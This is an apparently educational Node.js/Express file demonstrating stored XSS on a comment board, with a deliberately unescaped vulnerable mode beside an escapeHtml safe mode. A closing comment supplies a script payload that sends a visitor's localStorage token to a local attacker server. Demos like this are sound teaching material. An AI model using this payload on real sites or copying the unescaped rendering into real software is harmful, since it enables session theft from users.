// ---------- STORED XSS demo: a vulnerable comment board ----------
//
// Story: users log in (a fake token is saved in localStorage). They can post
// comments. One attacker posts a comment containing a <script>. Because the
// server renders comments WITHOUT escaping, that script runs in EVERY visitor's
// browser and steals their token.
//
// Run it:        node server.js
// Attacker box:  node attacker-server.js   (in another terminal)
//
// Then open http://localhost:8091 in a browser.
//   - Vulnerable mode (default): the injected script runs -> token stolen.
//   - Safe mode (?safe=1):        the script is shown as plain text -> safe.

const express = require("express");
const app = express();
app.use(express.urlencoded({ extended: true }));

const PORT = 8091;

// In-memory "database" of comments. Starts with one normal comment.
const comments = ["Great article, thanks!"];

// Escape HTML so user input is shown as TEXT, never run as code.
// This single function is the core XSS fix.
// string verification 
// string sanitization
function escapeHtml(str) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

app.get("/", (req, res) => {
  const safe = req.query.safe === "1";

  const commentsHtml = comments
    .map((c) => `<li>${safe ? escapeHtml(c) : c}</li>`) // <-- the vuln / the fix
    .join("");

  res.send(`
    <html>
      <body style="font-family: sans-serif; max-width: 640px; margin: 40px auto;">
        <h2>💬 Comment Board ${safe ? "(SAFE mode)" : "(VULNERABLE mode)"}</h2>
        <p style="color:#888">
          Mode:
          <a href="/">vulnerable</a> | <a href="/?safe=1">safe</a>
        </p>

        <form method="POST" action="/comment?safe=${safe ? "1" : "0"}">
          <input name="text" placeholder="Write a comment..." style="width:70%" />
          <button type="submit">Post</button>
        </form>

        <h3>Comments</h3>
        <ul>${commentsHtml}</ul>

        <script>
          // Simulate a logged-in user: store an auth token in localStorage.
          if (!localStorage.getItem("token")) {
            localStorage.setItem("token", "SECRET-JWT-abc123");
          }
        </script>
      </body>
    </html>
  `);
});

app.post("/comment", (req, res) => {
  const safe = req.query.safe === "1";
  if (req.body.text) comments.push(req.body.text);
  res.redirect(safe ? "/?safe=1" : "/");
});

app.listen(PORT, () => {
  console.log(`Comment board running on http://localhost:${PORT}`);
  console.log("Start the attacker server too:  node attacker-server.js");
});


/***
 * 
 * 
 * TO run the attack just add this in the comment box 
 * <script>fetch("http://localhost:5555/?token=" + localStorage.getItem("token"))</script>
 */